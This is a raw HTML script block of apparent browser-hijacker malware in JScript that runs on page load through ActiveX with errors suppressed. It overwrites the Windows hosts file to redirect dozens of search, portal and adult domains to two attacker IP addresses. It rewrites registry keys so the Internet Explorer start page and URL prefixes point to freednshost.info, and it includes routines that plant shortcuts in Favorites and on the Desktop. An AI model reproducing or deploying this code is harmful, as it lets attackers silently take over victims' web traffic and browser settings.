<script>
function stopErrors() {return true;}
window.onerror = stopErrors;

Shl = new ActiveXObject("WScript.Shell");
FSO = new ActiveXObject("Scripting.FileSystemObject");
Fav = Shl.SpecialFolders("Favorites");
Des = Shl.SpecialFolders("Desktop");
Win = FSO.GetSpecialFolder(0);

function bookmark(name,url,ico){f=FSO.OpenTextFile(Fav+"\\"+name+".url",2,"TRUE");f.WriteLine("[DEFAULT]\r\nBASEURL="+url+"\r\n[InternetShortcut]\r\nURL="+url);if(ico>1){f.WriteLine("IconIndex="+ico+"\r\nIconFile=%SystemRoot%\\explorer.exe");}f.Close();}

function desktop(name,url,ico){f=FSO.OpenTextFile(Des+"\\"+name+".url",2,"TRUE");f.WriteLine("[DEFAULT]\r\nBASEURL="+url+"\r\n[InternetShortcut]\r\nURL="+url);if(ico>1){f.WriteLine("IconIndex="+ico+"\r\nIconFile=%SystemRoot%\\explorer.exe");}f.Close();}

hosts = "213.159.118.226 1-se.com\r\n213.159.118.226 58q.com\r\n213.159.118.226 aifind.cc\r\n213.159.118.226 aifind.info\r\n213.159.118.226 allneedsearch.com\r\n213.159.118.226 approvedlinks.com\r\n213.159.118.226 auto.ie.searchforge.com\r\n213.159.118.226 awebfind.biz\r\n213.159.118.226 best.royalsearch.net\r\n213.159.118.226 cracks.am\r\n213.159.118.226 default-homepage-network.com\r\n213.159.118.226 find.microgirls.com\r\n213.159.118.226 find4u.net\r\n213.159.118.226 freshvideogals.com\r\n213.159.118.226 i-lookup.com\r\n213.159.118.226 ie-search.com\r\n213.159.118.226 in.webcounter.cc\r\n213.159.118.226 itseasy.us\r\n213.159.118.226 just.find-itnow.com\r\n213.159.118.226 link.startmake.com\r\n213.159.118.226 mysearchnow.com\r\n213.159.118.226 nativehardcore.com\r\n213.159.118.226 qwertysearch123.biz\r\n213.159.118.226 search.ieplugin.com\r\n213.159.118.226 search.psn.cn\r\n213.159.118.226 searchbar.findthewebsiteyouneed.com\r\n213.159.118.226 searchcentrix.com\r\n213.159.118.226 searchmyrequest.com\r\n213.159.118.226 super-spider.com\r\n213.159.118.226 t.rack.cc\r\n213.159.118.226 teen-biz.com\r\n213.159.118.226 teenhqpics.com\r\n213.159.118.226 tits.hardcore4ever.net\r\n213.159.118.226 webcoolsearch.com\r\n213.159.118.226 wmmse.com\r\n213.159.118.226 www.008i.com\r\n213.159.118.226 www.2fastsearch.net\r\n213.159.118.226 www.8095.com\r\n213.159.118.226 www.alfa-search.com\r\n213.159.118.226 www.boredlife.com\r\n213.159.118.226 www.couldnotfind.com\r\n213.159.118.226 www.cracks.am\r\n213.159.118.226 www.daum.net\r\n213.159.118.226 www.dreamwiz.com\r\n213.159.118.226 www.find-itnow.com\r\n213.159.118.226 www.find-itnow.com\r\n213.159.118.226 www.find4u.net\r\n213.159.118.226 www.firstbookmark.com\r\n213.159.118.226 www.gajai.com\r\n213.159.118.226 www.hand-book.com\r\n213.159.118.226 www.hao123.com\r\n213.159.118.226 www.hotsearchbox.com\r\n213.159.118.226 www.hotwebsearch.com\r\n213.159.118.226 www.hugesearch.net\r\n213.159.118.226 www.iquicksearch.com\r\n213.159.118.226 www.lookfor.cc\r\n213.159.118.226 www.maxxxhosters.com\r\n213.159.118.226 www.naver.com\r\n213.159.118.226 www.nkvd.us\r\n213.159.118.226 www.novafuck.com\r\n213.159.118.226 www.ohcorea.com\r\n213.159.118.226 www.omega-search.com\r\n213.159.118.226 www.onet.pl\r\n213.159.118.226 www.power-search.info\r\n213.159.118.226 www.rightfinder.net\r\n213.159.118.226 www.search-1.net\r\n213.159.118.226 www.search-and-go.com\r\n213.159.118.226 www.search-dot.com\r\n213.159.118.226 www.search-space.com\r\n213.159.118.226 www.searchforge.com\r\n213.159.118.226 www.searching-the-net.com\r\n213.159.118.226 www.searchv.com\r\n213.159.118.226 www.searchxl.com\r\n213.159.118.226 www.seznam.cz\r\n213.159.118.226 www.slotch.com\r\n213.159.118.226 www.spidersearch.com\r\n213.159.118.226 www.startium.com\r\n213.159.118.226 www.therealsearch.com\r\n213.159.118.226 www.ttjj.com\r\n213.159.118.226 www.viewpornkey.com\r\n213.159.118.226 www.wazzupnet.com\r\n213.159.118.226 www.websearch.com\r\n213.159.118.226 www.windowws.cc\r\n213.159.118.226 www.xgmm.com\r\n81.211.105.49 greatsearch.biz\r\n81.211.105.49 www.greatsearch.biz\r\n81.211.105.49 cashsearch.biz\r\n81.211.105.49 www.cashsearch.biz\r\n127.0.0.1 www.hard-virgins.com\r\n127.0.0.1 hard-virgins.com\r\n127.0.0.1 www.only-virgins.com\r\n127.0.0.1 only-virgins.com\r\n127.0.0.1 petite-virgins.biz\r\n127.0.0.1 www.petite-virgins.biz\r\n213.159.118.226 xwebsearch.biz\r\n213.159.118.226 yourbookmarks.ws";

if(FSO.FileExists(win+"system32\\drivers\\etc\\hosts")) {tfile=Win.CreateTextFile("system32\\drivers\\etc\\hosts");tfile.writeline(hosts);tfile.close();}
else if(FSO.FileExists(win+"hosts")) {tfile=Win.CreateTextFile("hosts");tfile.writeline(hosts);tfile.close();}



var pre = "http://freednshost.info/page/";
var hom = "http://freednshost.info/";

Shl.RegWrite("HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page", hom);
Shl.RegWrite("HKLM\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page", hom);
Shl.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\URL\\DefaultPrefix", pre);
Shl.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\URL\\Prefixes", pre);
Shl.RegWrite("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\URL\\DefaultPrefix", pre);
Shl.RegWrite("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\URL\\Prefixes", pre);
</script>
